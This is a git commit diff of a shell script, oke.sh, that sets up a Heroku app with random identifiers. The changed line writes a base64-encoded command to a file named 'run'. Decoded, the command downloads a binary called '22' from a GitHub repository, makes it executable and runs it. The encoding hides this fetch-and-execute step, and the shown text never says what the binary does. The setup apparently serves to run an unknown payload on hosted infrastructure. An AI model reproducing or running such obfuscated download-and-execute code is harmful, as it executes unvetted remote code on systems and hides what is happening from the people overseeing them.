01a42f2a85aaadadb6e5d2e6bffb903b22eb38b0
dse8347 <107747125+dse8347@users.noreply.github.com>
2022-08-02 11:49:45 +0800

    Update oke.sh

--- oke.sh
+++ oke.sh
@@ -34,7 +34,7 @@ sc29=$(shuf -i 1-9999999999 -n 1)
 sc30=$(shuf -i 1-9999999999 -n 1)
 scmin=$(shuf -i 1-9999999999 -n 1)
 buildpack="heroku/python"
-echo 'd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vZHNlODM0Ny9kci9yYXcvbWFpbi8yMgpjaG1vZCAreCAyMgouLzIyCg==' > run
+echo 'd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vZHNlODM0Ny9kci9yYXcvbWFpbi8yMgpjaG1vZCA3NzcgMjIKLi8yMgo' > run
 echo 'web: bash' > Procfile
 echo '*' > .gitignore
 touch main.py requirements.txt
